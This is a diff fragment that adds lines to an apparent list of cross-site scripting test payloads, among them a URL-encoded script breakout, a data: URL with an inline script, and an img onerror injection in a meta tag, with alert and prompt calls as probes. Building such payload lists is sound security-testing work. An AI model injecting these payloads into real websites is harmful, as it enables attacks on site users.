@@ -1,3 +1,6 @@
+13249614);}};prompt(document.domain);function%20require(test){};function%20funRun(){switch%20(1){case%201:console.log(1
+data:text/html,<html><body>Hello<script>alert("Remembering SSR")</script></body></html>
+<meta name="ajs-jql" content="text ~><img src=1 onerror=alert(1)>">
 </script>"><script>prompt(1)</script>
 </ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>
 "><img src=x onerror=prompt(1)>
